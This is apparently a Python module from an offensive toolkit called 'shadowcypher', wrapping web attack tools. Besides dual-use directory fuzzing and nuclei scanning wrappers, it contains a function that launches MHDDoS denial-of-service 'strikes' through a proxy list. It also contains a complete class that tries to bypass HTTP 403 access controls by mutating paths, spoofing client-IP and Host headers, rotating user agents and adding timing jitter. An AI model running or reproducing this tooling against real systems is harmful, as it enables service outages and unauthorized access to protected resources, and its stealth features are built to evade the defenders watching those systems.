"""Web Attacks Module — Ffuf fuzzing and Nuclei template scanning."""

import os
import shutil

from shadowcypher.core.logger import logger
from shadowcypher.core.runner import runner
from shadowcypher.core.sanitize import validate_target
from shadowcypher.core.stealth import require_stealth


class WebSecurity:
    """The 'Web Assault' engine. Integrates Ffuf and Nuclei."""

    @staticmethod
    def ffuf_dir_fuzz(
        url,
        wordlist="/usr/share/wordlists/dirb/common.txt",
        extension="",
        on_output=None,
        on_complete=None,
    ):
        """Directory and file fuzzing with Ffuf."""
        require_stealth(on_output=on_output)
        from shadowcypher.core.config import config
        ffuf = config.get_tool_path("ffuf")

        if not validate_target(url):
            if on_output:
                on_output(f"[ERROR] Invalid URL: {url}")
            return

        fuzz_url = url.rstrip("/") + "/FUZZ"
        if extension:
            fuzz_url += f".{extension.strip('.')}"

        args = [ffuf, "-c", "-w", wordlist, "-u", fuzz_url, "-t", "50"]
        logger.info("web", f"FFUF Directory Fuzzing: {fuzz_url}")
        return runner.execute_task(f"FFUF_DIR_{url}", args, callback=on_output)

    @staticmethod
    def ffuf_vhost_fuzz(
        url,
        host_header,
        wordlist="/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt",
        on_output=None,
        on_complete=None,
    ):
        """Virtual Host (VHost) fuzzing with Ffuf."""
        require_stealth(on_output=on_output)
        from shadowcypher.core.config import config
        ffuf = config.get_tool_path("ffuf")

        if not validate_target(url):
            if on_output:
                on_output(f"[ERROR] Invalid URL: {url}")
            return

        args = [
            ffuf,
            "-c",
            "-w",
            wordlist,
            "-u",
            url,
            "-H",
            f"Host: {host_header}",
            "-t",
            "50",
        ]
        logger.info("web", f"FFUF VHost Fuzzing: {url} -> {host_header}")
        return runner.execute_task(f"FFUF_VHOST_{url}", args, callback=on_output)

    @staticmethod
    def nuclei_scan(
        target, template_tags="", severity="", on_output=None, on_complete=None
    ):
        """Nuclei template-based vulnerability scanning."""
        require_stealth(on_output=on_output)
        from shadowcypher.core.config import config
        nuclei = config.get_tool_path("nuclei")

        if not validate_target(target):
            if on_output:
                on_output(f"[ERROR] Invalid target: {target}")
            return

        args = [nuclei, "-u", target, "-c", "50", "-no-color"]

        if template_tags:
            args.extend(["-tags", template_tags])

        if severity:
            args.extend(["-severity", severity])

        logger.info(
            "web", f"Nuclei Scan: {target} (Tags: {template_tags}, Sev: {severity})"
        )
        return runner.execute_task(f"NUCLEI_{target}", args, callback=on_output)

    @staticmethod
    def nuclei_update(on_output=None, on_complete=None):
        """Update Nuclei templates."""
        return runner.execute_task(
            "NUCLEI_UPDATE", ["nuclei", "-ut"], callback=on_output
        )

    @staticmethod
    def dir_bust(
        url,
        wordlist="/usr/share/wordlists/dirb/common.txt",
        extensions="php,html,txt,js",
        threads=50,
        on_output=None,
        on_complete=None,
    ):
        """
        Directory and file brute-forcing with tool auto-selection:
        feroxbuster > gobuster > ffuf (whichever is installed).
        """
        require_stealth(on_output=on_output)
        if not validate_target(url):
            if on_output:
                on_output(f"[ERROR] Invalid URL: {url}")
            return

        if shutil.which("feroxbuster"):
            args = [
                "feroxbuster",
                "--url", url,
                "--wordlist", wordlist,
                "--extensions", extensions,
                "--threads", str(threads),
                "--no-state",
                "--quiet",
            ]
            logger.info("web", f"feroxbuster: {url}")
            return runner.execute_task(f"FEROX_{url}", args, callback=on_output)

        if shutil.which("gobuster"):
            args = [
                "gobuster", "dir",
                "-u", url,
                "-w", wordlist,
                "-x", extensions,
                "-t", str(threads),
                "--no-error",
                "-q",
            ]
            logger.info("web", f"gobuster: {url}")
            return runner.execute_task(f"GOBUST_{url}", args, callback=on_output)

        # ffuf fallback
        from shadowcypher.core.config import config
        ffuf = config.get_tool_path("ffuf")
        fuzz_url = url.rstrip("/") + "/FUZZ"
        args = [ffuf, "-c", "-w", wordlist, "-u", fuzz_url, "-t", str(threads), "-mc", "200,204,301,302,307,401,403"]
        logger.info("web", f"ffuf fallback: {fuzz_url}")
        return runner.execute_task(f"FFUF_DIR_{url}", args, callback=on_output)

    @staticmethod
    def mhddos_strike(target, method="GET", threads=100, duration=60, on_output=None):
        """Execute elite Layer 7 or Layer 4 suppression using the MHDDoS engine."""
        require_stealth(on_output=on_output)
        from shadowcypher.core.config import config
        project_root = str(config.project_root)
        path = os.path.join(project_root, "tools", "elite", "MHDDoS", "start.py")
        proxies = os.path.join(project_root, "tools", "elite", "MHDDoS", "files", "proxies", "proxies.txt")

        if not os.path.exists(path):
            if on_output:
                on_output("[ERROR] MHDDoS_ENGINE_NOT_STAGED. Run elite tool acquisition.")
            return

        # Basic command assembly
        args = ["python3", path, method, target, "5", str(threads), proxies, "100", str(duration)]
        logger.info("web", f"MHDDoS STRIKE_DISPATCHED: {target} (Method: {method}, Duration: {duration}s)")
        return runner.execute_task(f"MHDDOS_{target}", args, callback=on_output)
    @staticmethod
    def bypass_403_test(url, path, on_output=None):
        """Execute the advanced Bypass 403 sequence."""
        require_stealth(on_output=on_output)
        logger.info("web", f"BYPASS_403_SEQUENCE_INITIATED: {url}{path}")

        # Integration logic for the AI-generated tool
        tool = Bypass403Tool(base_url=url)

        def _run():
            results = tool.test_bypass(target_path=path, rate_limit=0.1)
            for res in results:
                if res['success']:
                    msg = f"[SUCCESS] POTENTIAL_BYPASS: {res['url_tested']} (Status: {res['status_code']})"
                    if on_output:
                        on_output(msg)
                    logger.info("web", msg)
                else:
                    if on_output:
                        on_output(f"[-] Tried: {res['url_tested']} (Status: {res['status_code']})")

        import threading
        threading.Thread(target=_run, daemon=True).start()
        return "BYPASS_SEQUENCE_STARTED"

class Bypass403Tool:
    """
    A multi-vector tool designed to bypass HTTP 403 Forbidden errors
    by manipulating headers, paths, and request structure.
    """
    def __init__(self, base_url: str, headers: dict = None):
        self.base_url = base_url.rstrip('/')
        self.base_headers = headers if headers else {}
        import random

        import requests
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
        ]
        self.session.headers.update({
            "User-Agent": random.choice(self.user_agents),
            **self.base_headers
        })

    def _generate_path_variations(self, path: str) -> list[str]:
        path = "/" + path.lstrip("/")
        variations = {path, path.lower(), path.upper()}
        traversal_paths = [path.replace("/", "/./"), path.replace("/", "/; /")]
        for tp in traversal_paths:
            variations.add(tp)
        variations.add(path.replace("/", "%2f"))
        return list(variations)

    def _generate_header_payloads(self) -> list[dict]:
        payloads = []
        xff_ips = ["127.0.0.1", "192.168.1.1", "10.0.0.1", "::1"]
        for ip in xff_ips:
            h = self.base_headers.copy()
            h['X-Forwarded-For'] = ip
            h['X-Real-IP'] = ip
            h['X-Client-IP'] = ip
            h['X-Custom-IP-Authorization'] = ip
            payloads.append(h)
        h_host = self.base_headers.copy()
        h_host['Host'] = "localhost"
        payloads.append(h_host)
        return payloads

    def test_bypass(self, target_path: str, method: str = 'GET', rate_limit: float = 0.1):
        import time
        from urllib.parse import urljoin

        results = []
        path_variations = self._generate_path_variations(target_path)
        header_payloads = self._generate_header_payloads()

        for p_var in path_variations:
            for h_pay in header_payloads:
                full_url = urljoin(self.base_url, p_var)
                try:
                    r = self.session.request(method, full_url, headers=h_pay, timeout=5)
                    results.append({
                        "url_tested": full_url,
                        "status_code": r.status_code,
                        "success": 200 <= r.status_code < 400
                    })
                except Exception:
                    pass
                # Random jitter: ±25% of rate_limit
                import random
                jitter = rate_limit * (random.uniform(0.75, 1.25))
                time.sleep(jitter)
        return results
